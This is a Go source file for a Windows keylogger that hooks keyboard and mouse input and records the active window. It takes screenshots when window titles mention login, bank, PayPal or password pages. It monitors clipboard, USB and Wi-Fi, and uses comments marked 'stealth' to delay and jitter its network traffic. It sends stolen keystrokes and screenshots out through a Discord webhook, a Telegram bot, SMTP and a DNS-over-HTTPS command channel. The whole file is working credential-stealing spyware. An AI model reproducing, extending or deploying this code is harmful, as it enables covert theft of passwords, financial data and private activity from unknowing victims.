package monitor

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	"io"
	randv2 "math/rand/v2"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"

	"shadowlog/config"
	"github.com/kbinani/screenshot"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/mouse"
	"github.com/moutend/go-hook/pkg/types"
)

// ── Performance: Shared HTTP client with keep-alive + connection pooling ──
// Creating a new http.Client per request leaks connections and burns CPU.
var sharedHTTPClient = &http.Client{
	Timeout: 30 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        5,
		MaxIdleConnsPerHost: 2,
		IdleConnTimeout:     90 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	},
}

// ── Performance: Sync pool for screenshot byte buffers ──
var screenshotBufPool = sync.Pool{
	New: func() interface{} {
		return new(bytes.Buffer)
	},
}

// Package-level keyword list for screenshot triggers — avoids re-allocation per keystroke.
var keywords = []string{"login", "signin", "sign in", "password", "bank", "paypal", "checkout", "auth", "credential", "verify", "account", "billing", "submit"}

// Windows API function pointers for window and process information.
// These are used to get active window title and process name.
var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procGetWindowText = user32.NewProc("GetWindowTextW")
	procGetForeground = user32.NewProc("GetForegroundWindow")
	procGetPID       = user32.NewProc("GetWindowThreadProcessId")

	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess  = kernel32.NewProc("OpenProcess")

	psapi            = syscall.NewLazyDLL("psapi.dll")
	procGetModName   = psapi.NewProc("GetModuleBaseNameW")

	procGetMessage       = user32.NewProc("GetMessageW")
	procTranslateMessage = user32.NewProc("TranslateMessage")
	procDispatchMessage  = user32.NewProc("DispatchMessage")
	procToUnicode        = user32.NewProc("ToUnicode")
	procGetKeyboardState = user32.NewProc("GetKeyboardState")
	procGetKeyState      = user32.NewProc("GetKeyState")
	procMapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	procGetWindowRect    = user32.NewProc("GetWindowRect")
)

// RECT is the Windows rectangle structure.
type RECT struct {
	Left, Top, Right, Bottom int32
}

// MSG is the Windows message structure.
type MSG struct {
	Hwnd    uintptr
	Message uint32
	Wparam  uintptr
	Lparam  uintptr
	Time    uint32
	Pt      struct {
		X int32
		Y int32
	}
}

// Logger represents the keylogger instance.
// It holds configuration and batches keystroke data before reporting.
type Logger struct {
	Config    *config.Config // Configuration settings.
	Batch     []string       // Buffer for batching keystroke logs.
	Mu        sync.Mutex     // Mutex for safe batch access.
	LastHwnd    uintptr        // Cache for last active window handle.
	LastTitle      string         // Cache for last active window title.
	LogQueue       chan string    // Channel for reporting worker pool.
	LogCallback    func(string)   // Optional callback for UI live preview.
	LastScreenshot time.Time      // Debounce timestamp for screenshots
	LastActiveWin  string         // Track window focus changes
	PauseChan      chan bool       // Remote pause/resume channel
	Paused         bool           // Whether monitoring is paused
	writeCount     int            // Throttle log rotation checks
	cachedGCM      cipher.AEAD    // Reuse AES-GCM cipher (avoids re-init per call)
	titleBuf       [256]uint16    // Pre-allocated buffer for window title
	nameBuf        [256]uint16    // Pre-allocated buffer for process name
	takingScreenshot atomic.Bool  // Prevent concurrent screenshot batches
}

// NewLogger creates a new Logger instance with the given configuration.
func NewLogger(cfg *config.Config, cb func(string)) *Logger {
	// Cap GOMAXPROCS to 2 — we don't need full core utilization.
	runtime.GOMAXPROCS(2)

	l := &Logger{
		Config:      cfg,
		Batch:       make([]string, 0, 10),
		LogQueue:    make(chan string, 64),
		LogCallback: cb,
		PauseChan:   make(chan bool, 1),
	}

	// Pre-initialize the AES-GCM cipher once (avoids re-creating on every write).
	block, err := aes.NewCipher(config.GetEncryptionKey())
	if err == nil {
		if gcm, err := cipher.NewGCM(block); err == nil {
			l.cachedGCM = gcm
		}
	}

	return l
}

// Start begins the keylogging process.
// It installs a global keyboard hook and processes keystroke events in a loop.
// The function runs indefinitely until the program is terminated.
func (l *Logger) Start() {
	// Channel to receive keyboard events from the hook.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	// Install the global keyboard hook.
	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return
	}
	defer keyboard.Uninstall()

	// 0. Install the global mouse hook.
	mouseChan := make(chan types.MouseEvent, 100)
	if err := mouse.Install(nil, mouseChan); err != nil {
		return
	}
	defer mouse.Uninstall()

	// 1. Initial Pulse: Verify writing to the unified storage file.
	if l.Config.LogLocal {
		ts := time.Now().Format("2006-01-02 15:04:05")
		l.report(fmt.Sprintf("[%s] [System] Monitor Started (v4.0)", ts))
	}

	// Ticker for periodic flushing (every 15 seconds).
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	// Ticker for focus change monitoring (every 2 seconds — reduced from 1s to halve CPU wake-ups).
	focusTicker := time.NewTicker(2 * time.Second)
	defer focusTicker.Stop()

	// Start the reporting worker pool.
	go l.worker()

	// Start Clipboard Monitor.
	clipMon := newClipboardMonitor(func(logLine string) {
		l.report(logLine)
	})
	go clipMon.start()

	// Start USB Drive Monitor.
	usbMon := newUSBMonitor(func(logLine string) {
		l.report(logLine)
	})
	go usbMon.start()

	// Start Wi-Fi Network Monitor.
	wifiMon := newWifiMonitor(func(logLine string) {
		l.report(logLine)
	})
	go wifiMon.start()

	// Start Remote Kill Switch (if Telegram is configured).
	ks := newKillSwitch(l.Config.TelegramToken, l.Config.TelegramChatID, l.Config.KillSwitchEnabled)
	go ks.start(l.PauseChan)

	// Start pause listener.
	go func() {
		for paused := range l.PauseChan {
			l.Mu.Lock()
			l.Paused = paused
			l.Mu.Unlock()
		}
	}()

	// Start event loop in a background goroutine.
	go func() {
		for {
			select {
			case ev, ok := <-keyboardChan:
				if !ok {
					return
				}
				// Check pause state.
				l.Mu.Lock()
				paused := l.Paused
				l.Mu.Unlock()
				if paused {
					continue
				}
				if ev.Message == 0x0100 {
					key := l.mapVKCode(uint32(ev.VKCode))
					if key == "" {
						continue
					}

					win := l.getActiveWindowInfo()
					l.checkScreenshotTrigger(win, false)

					ts := time.Now().Format("2006-01-02 15:04:05")
					logLine := fmt.Sprintf("[%s] [%s] %s", ts, win, key)

					l.Mu.Lock()
					l.Batch = append(l.Batch, logLine)
					// Flush at 10 keystrokes instead of 3 — reduces disk I/O by ~70%.
					if len(l.Batch) >= 10 {
						combined := strings.Join(l.Batch, "\n")
						l.Batch = l.Batch[:0]
						l.Mu.Unlock()
						l.report(combined)
					} else {
						l.Mu.Unlock()
					}
					
					if l.LogCallback != nil {
						l.LogCallback(logLine)
					}
				}
			case mouseEv, ok := <-mouseChan:
				if !ok {
					return
				}
				// TRIGGER 3: Click detection (0x0201 = Left Click Down)
				if mouseEv.Message == 0x0201 {
					win := l.getActiveWindowInfo()
					// Check for "Login" button feel
					l.checkScreenshotTrigger(win, true)
				}
			case <-focusTicker.C:
				// TRIGGER 2: Screenshot on Focus Change (immediate)
				win := l.getActiveWindowInfo()
				l.Mu.Lock()
				if win != l.LastActiveWin {
					l.LastActiveWin = win
					l.Mu.Unlock()
					l.checkScreenshotTrigger(win, true)
				} else {
					l.Mu.Unlock()
				}
			case <-ticker.C:
				l.Mu.Lock()
				if len(l.Batch) > 0 {
					combined := strings.Join(l.Batch, "\n")
					l.Batch = l.Batch[:0]
					l.Mu.Unlock()
					l.report(combined)
				} else {
					l.Mu.Unlock()
				}
			}
		}
	}()

	// Windows: To keep low-level hooks alive, we MUST run a message loop on this thread.
	// Without this, Windows will eventually timeout the hook or it will stop responding.
	var msg MSG
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if int32(ret) == -1 || ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

// mapVKCode converts a Windows virtual key code to a readable string.
// Returns an empty string for unmappable keys.
func (l *Logger) mapVKCode(vk uint32) string {
	// 1. Handle special non-printable keys first.
	switch vk {
	case 0x08: return "[BACKSPACE]"
	case 0x09: return "[TAB]"
	case 0x0D: return "[ENTER]"
	case 0x10, 0xA0, 0xA1: return "[SHIFT]"
	case 0x11, 0xA2, 0xA3: return "[CTRL]"
	case 0x12, 0xA4, 0xA5: return "[ALT]"
	case 0x14: return "[CAPSLOCK]"
	case 0x1B: return "[ESC]"
	case 0x20: return " " // Space
	case 0x21: return "[PAGEUP]"
	case 0x22: return "[PAGEDOWN]"
	case 0x23: return "[END]"
	case 0x24: return "[HOME]"
	case 0x25: return "[LEFT]"
	case 0x26: return "[UP]"
	case 0x27: return "[RIGHT]"
	case 0x28: return "[DOWN]"
	case 0x2E: return "[DELETE]"
	}

	// 2. Numpad Keys — pre-computed strings to avoid fmt.Sprintf in hot path.
	if vk >= 0x60 && vk <= 0x69 {
		return string(rune('0' + vk - 0x60))
	}
	switch vk {
	case 0x6A: return "*"
	case 0x6B: return "+"
	case 0x6C: return "[SEPARATOR]"
	case 0x6D: return "-"
	case 0x6E: return "."
	case 0x6F: return "/"
	}

	// 3. Function Keys — lookup table avoids fmt.Sprintf per keystroke.
	var fKeys = [...]string{"[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]","[F8]","[F9]","[F10]","[F11]","[F12]","[F13]","[F14]","[F15]","[F16]","[F17]","[F18]","[F19]","[F20]","[F21]","[F22]","[F23]","[F24]"}
	if vk >= 0x70 && vk <= 0x87 {
		return fKeys[vk-0x70]
	}

	// 4. Advanced Mapping using ToUnicode for international support.
	var keyboardState [256]byte

	// Manually populate modifier states for ToUnicode.
	// This ensures Shift/AltGr/CapsLock are reflected for special symbols like @#! etc.
	modifiers := []uint32{0x10, 0x11, 0x12, 0x14} // Shift, Ctrl, Alt, CapsLock
	for _, m := range modifiers {
		ret, _, _ := procGetKeyState.Call(uintptr(m))
		if ret&0x8000 != 0 {
			keyboardState[m] = 0x80
		} else if m == 0x14 && ret&0x0001 != 0 { // CapsLock toggle bit
			keyboardState[m] = 0x01
		}
	}

	// We need the scan code for ToUnicode.
	scanCode, _, _ := procMapVirtualKey.Call(uintptr(vk), 0)

	var buffer [16]uint16
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&keyboardState[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		0,
	)

	if ret > 0 {
		return syscall.UTF16ToString(buffer[:ret])
	}

	return "" // Unmappable key.
}

// getActiveWindowInfo retrieves information about the currently active window.
// Returns a string in the format "process.exe - Window Title".
// Falls back to title only or "Unknown App" if process name unavailable.
func (l *Logger) getActiveWindowInfo() string {
	// Get handle to foreground window.
	hwnd, _, _ := procGetForeground.Call()
	if hwnd == 0 {
		return "Idle"
	}

	// Caching logic: If HWND is the same, return cached title.
	l.Mu.Lock()
	if hwnd == l.LastHwnd && l.LastTitle != "" {
		title := l.LastTitle
		l.Mu.Unlock()
		return title
	}
	l.Mu.Unlock()

	// Get window title — use pre-allocated struct buffer (zero alloc).
	for i := range l.titleBuf {
		l.titleBuf[i] = 0
	}
	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&l.titleBuf[0])), uintptr(len(l.titleBuf)))
	title := syscall.UTF16ToString(l.titleBuf[:])

	// Get process ID of the window.
	var pid uint32
	procGetPID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var pName string
	// Open process handle to get process name.
	hProc, _, _ := procOpenProcess.Call(0x1000|0x0010, 0, uintptr(pid))
	if hProc != 0 {
		for i := range l.nameBuf {
			l.nameBuf[i] = 0
		}
		procGetModName.Call(hProc, 0, uintptr(unsafe.Pointer(&l.nameBuf[0])), uintptr(len(l.nameBuf)))
		pName = syscall.UTF16ToString(l.nameBuf[:])
		syscall.CloseHandle(syscall.Handle(hProc))
	}

	// Build result string.
	var finalInfo string
	switch {
	case title != "" && pName != "":
		var b strings.Builder
		b.Grow(len(pName) + 3 + len(title))
		b.WriteString(pName)
		b.WriteString(" - ")
		b.WriteString(title)
		finalInfo = b.String()
	case pName != "":
		finalInfo = pName
	case title != "":
		finalInfo = title
	default:
		finalInfo = "Unknown App"
	}

	// Update cache.
	l.Mu.Lock()
	l.LastHwnd = hwnd
	l.LastTitle = finalInfo
	l.Mu.Unlock()

	return finalInfo
}

// report sends the batched log data to configured destinations.
// Supports Discord webhook and/or local file logging.
// Runs asynchronously to avoid blocking the main logging loop.
func (l *Logger) report(content string) {
	select {
	case l.LogQueue <- content:
	default:
		// Queue full, drop log to avoid blocking and maintain stealth.
	}
}

// worker handles the actual reporting with multi-channel delivery.
func (l *Logger) worker() {
	// STEALTH: Wait 60-180 seconds before the first network sync.
	startupDelay := time.Duration(60+randv2.IntN(120)) * time.Second
	time.Sleep(startupDelay)

	// Initialize exfiltration channels.
	smtp := newSMTPExfil(l.Config.SMTPHost, l.Config.SMTPPort, l.Config.SMTPUser, l.Config.SMTPPass, l.Config.SMTPTo)
	doh := newDoHC2(l.Config.DoHEndpoint)

	path := config.GetStoragePath()

	for content := range l.LogQueue {
		// 0. Throttled log rotation — check every 50 writes instead of every write.
		l.writeCount++
		if l.writeCount%50 == 0 {
			config.RotateLogIfNeeded()
		}

		// 1. ALWAYS Save to local storage first (Source of Truth).
		encrypted, err := l.encrypt([]byte(content))
		if err == nil {
			encoded := base64.StdEncoding.EncodeToString(encrypted)
			file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
			if err == nil {
				file.WriteString(encoded)
				file.WriteString("\n")
				file.Close()
			}
		}

		// 2. Sync to Discord if configured.
		l.syncDiscord()

		// STEALTH: Random jitter between sync calls (2-8 seconds).
		time.Sleep(time.Duration(2+randv2.IntN(6)) * time.Second)

		// 3. Sync to Telegram if configured.
		l.syncTelegram()

		// 4. Sync via SMTP if configured.
		if smtp.isEnabled() {
			smtp.send(content)
		}

		// 5. DoH C2 beacon (fallback — only if primary channels failed).
		if doh.isEnabled() && l.Config.WebhookURL == "" && l.Config.TelegramToken == "" && !smtp.isEnabled() {
			doh.exfiltrateViaDoH(content)
		}
	}
}

// syncDiscord attempts to send all pending logs from the local file to Discord.
// Logs are decrypted from the local storage file and sent as cleartext embeds.
func (l *Logger) syncDiscord() {
	if l.Config.WebhookURL == "" {
		return
	}

	path := config.GetStoragePath()
	file, err := os.Open(path)
	if err != nil {
		return
	}
	defer file.Close()

	// Skip lines already sent. Use separate SyncState file to avoid corruption.
	state := config.LoadSyncState()
	scanner := bufio.NewScanner(file)
	lineCount := 0
	var pendingLines []string

	for scanner.Scan() {
		lineCount++
		if lineCount <= 1 || lineCount <= state.LastSentIndex {
			continue
		}

		// Decrypt line
		line := scanner.Text()
		data, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			continue
		}
		decrypted, err := l.decrypt(data)
		if err != nil {
			continue
		}
		pendingLines = append(pendingLines, string(decrypted))
	}

	if len(pendingLines) == 0 {
		return
	}

	// Format nicely for Discord
	combined := strings.Join(pendingLines, "\n")
	
	// Discord has a 2000 char limit per message. Split if needed.
	chunks := l.splitMessage(combined, 1900)
	allSent := true
	for _, chunk := range chunks {
		msg := fmt.Sprintf("```\n%s\n```", chunk)
		payload := map[string]string{"content": msg}
		data, _ := json.Marshal(payload)

		req, err := http.NewRequest("POST", l.Config.WebhookURL, bytes.NewBuffer(data))
		if err != nil {
			allSent = false
			break
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")

		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Do(req)
		if err != nil || resp.StatusCode >= 300 {
			allSent = false
			if resp != nil {
				resp.Body.Close()
			}
			break
		}
		resp.Body.Close()

		// Rate limit: small delay between messages.
		time.Sleep(500 * time.Millisecond)
	}

	if allSent {
		state.LastSentIndex = lineCount
		config.SaveSyncState(state)
	}
}

// syncTelegram attempts to send all pending logs to Telegram as cleartext.
// Private Telegram bot channels are not scanned, so cleartext is safe.
func (l *Logger) syncTelegram() {
	if l.Config.TelegramToken == "" || l.Config.TelegramChatID == "" {
		return
	}

	path := config.GetStoragePath()
	file, err := os.Open(path)
	if err != nil {
		return
	}
	defer file.Close()

	// Skip lines already sent to Telegram.
	state := config.LoadSyncState()
	scanner := bufio.NewScanner(file)
	lineCount := 0
	var pendingLines []string

	for scanner.Scan() {
		lineCount++
		if lineCount <= 1 || lineCount <= state.LastSentTGIndex {
			continue
		}

		line := scanner.Text()
		data, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			continue
		}
		decrypted, err := l.decrypt(data)
		if err != nil {
			continue
		}
		pendingLines = append(pendingLines, string(decrypted))
	}

	if len(pendingLines) == 0 {
		return
	}

	// Format nicely for Telegram with Markdown.
	combined := strings.Join(pendingLines, "\n")
	
	// Telegram has a 4096 char limit. Split if needed.
	chunks := l.splitMessage(combined, 4000)
	allSent := true
	for _, chunk := range chunks {
		msg := fmt.Sprintf("```\n%s\n```", chunk)
		
		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", l.Config.TelegramToken)
		payload := map[string]string{
			"chat_id":    l.Config.TelegramChatID,
			"text":       msg,
			"parse_mode": "Markdown",
		}
		data, _ := json.Marshal(payload)

		req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(data))
		if err != nil {
			allSent = false
			break
		}
		req.Header.Set("Content-Type", "application/json")

		client := sharedHTTPClient
		resp, err := client.Do(req)
		if err != nil || resp.StatusCode >= 300 {
			allSent = false
			if resp != nil {
				resp.Body.Close()
			}
			break
		}
		resp.Body.Close()
		time.Sleep(500 * time.Millisecond)
	}

	if allSent {
		state.LastSentTGIndex = lineCount
		config.SaveSyncState(state)
	}
}

// splitMessage splits a string into chunks of maxLen size, splitting at newlines where possible.
func (l *Logger) splitMessage(s string, maxLen int) []string {
	if len(s) <= maxLen {
		return []string{s}
	}

	var chunks []string
	for len(s) > 0 {
		if len(s) <= maxLen {
			chunks = append(chunks, s)
			break
		}

		// Try to split at a newline within the limit.
		idx := strings.LastIndex(s[:maxLen], "\n")
		if idx <= 0 {
			idx = maxLen
		}
		chunks = append(chunks, s[:idx])
		s = s[idx:]
		if len(s) > 0 && s[0] == '\n' {
			s = s[1:]
		}
	}
	return chunks
}

// getGCM returns the cached AES-GCM cipher, or lazily initializes it.
func (l *Logger) getGCM() (cipher.AEAD, error) {
	if l.cachedGCM != nil {
		return l.cachedGCM, nil
	}
	block, err := aes.NewCipher(config.GetEncryptionKey())
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	l.cachedGCM = gcm
	return gcm, nil
}

// decrypt performs AES-256-GCM decryption using the cached cipher.
func (l *Logger) decrypt(data []byte) ([]byte, error) {
	gcm, err := l.getGCM()
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// encrypt performs AES-256-GCM encryption using the cached cipher.
func (l *Logger) encrypt(data []byte) ([]byte, error) {
	gcm, err := l.getGCM()
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}

// checkScreenshotTrigger scans the active window title for keywords and captures the screen.
// isImmediate = true means it's a fresh focus or click (skip periodic debounce if sensitive).
func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
	if l.Config.WebhookURL == "" && (l.Config.TelegramToken == "" || l.Config.TelegramChatID == "") {
		return
	}

	winLower := strings.ToLower(win)
	// Keywords indicating high-value context (package-level to avoid re-allocation).
	
	triggerFound := false
	for _, kw := range keywords {
		if strings.Contains(winLower, kw) {
			triggerFound = true
			break
		}
	}

	if !triggerFound {
		return
	}

	l.Mu.Lock()
	// Debounce: If it's immediate (click/focus), we allow it slightly more often (10s), otherwise 30s.
	limit := 30 * time.Second
	if isImmediate {
		limit = 10 * time.Second 
	}

	if time.Since(l.LastScreenshot) < limit {
		l.Mu.Unlock()
		return
	}
	l.LastScreenshot = time.Now()
	l.Mu.Unlock()

	// Internal pulse for debugging screenshot activity
	ts := time.Now().Format("15:04:05")
	l.report(fmt.Sprintf("[%s] [System] 📸 TARGET ACQUIRED: %s", ts, win))

	go l.takeAndSendScreenshot(win)
}

// takeAndSendScreenshot encodes a heavily compressed JPEG natively and ships it directly via Multipart POST.
// It takes a batch of 3 screenshots spaced 2.5 seconds apart to capture login flow context.
func (l *Logger) takeAndSendScreenshot(win string) {
	// Prevent concurrent overlapping batches
	if !l.takingScreenshot.CompareAndSwap(false, true) {
		return
	}
	defer l.takingScreenshot.Store(false)

	for i := 0; i < 3; i++ {
		if i == 0 {
			// Slight delay for the first capture to allow the target page/window to render visually
			time.Sleep(800 * time.Millisecond)
		} else {
			// Delay between subsequent batch captures
			time.Sleep(2500 * time.Millisecond)
		}

		n := screenshot.NumActiveDisplays()
		if n <= 0 {
			return
		}

		var bounds image.Rectangle
		// 1. TRY WINDOW BRACKETING: Only capture the active window for efficiency.
		hwnd, _, _ := procGetForeground.Call()
		if hwnd != 0 {
			var rect RECT
			ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
			if ret != 0 {
				bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
			}
		}

		// 2. FALLBACK: Full screen if window rect fails or is empty
		if bounds.Empty() {
			bounds = screenshot.GetDisplayBounds(0)
		}

		if bounds.Empty() {
			continue
		}

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			continue
		}

		// Use pooled buffer to avoid repeated heap allocations.
		buf := screenshotBufPool.Get().(*bytes.Buffer)
		buf.Reset()

		// Encode 60% quality JPEG — good balance of clarity and size.
		err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60})
		if err != nil {
			screenshotBufPool.Put(buf)
			continue
		}
		
		imageData := buf.Bytes()
		screenshotBufPool.Put(buf) // safe to return buffer since we copied bytes
		
		client := sharedHTTPClient
		ts := time.Now().Format("15:04:05")

		// 1. Stream RAM buffer to Discord multipart
		if l.Config.WebhookURL != "" {
			body := &bytes.Buffer{}
			writer := multipart.NewWriter(body)
			
			part, err := writer.CreateFormFile("file1", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
			if err == nil {
				part.Write(imageData)
			}
			
			writer.WriteField("content", fmt.Sprintf("📸 **Context Capture (%d/3)** `[%s]`\nWindow: `%s`", i+1, ts, win))
			writer.Close()

			req, _ := http.NewRequest("POST", l.Config.WebhookURL, body)
			req.Header.Set("Content-Type", writer.FormDataContentType())
			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
			client.Do(req)
		}

		// 2. Stream RAM buffer to Telegram multipart
		if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
			body := &bytes.Buffer{}
			writer := multipart.NewWriter(body)

			writer.WriteField("chat_id", l.Config.TelegramChatID)
			writer.WriteField("caption", fmt.Sprintf("📸 *Context Capture (%d/3)* `[%s]`\nWindow: `%s`", i+1, ts, win))
			writer.WriteField("parse_mode", "Markdown")
			
			part, err := writer.CreateFormFile("photo", fmt.Sprintf("capture_batch_%d.jpeg", i+1))
			if err == nil {
				part.Write(imageData)
			}
			writer.Close()

			url := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
			req, _ := http.NewRequest("POST", url, body)
			req.Header.Set("Content-Type", writer.FormDataContentType())
			client.Do(req)
		}
	}
}
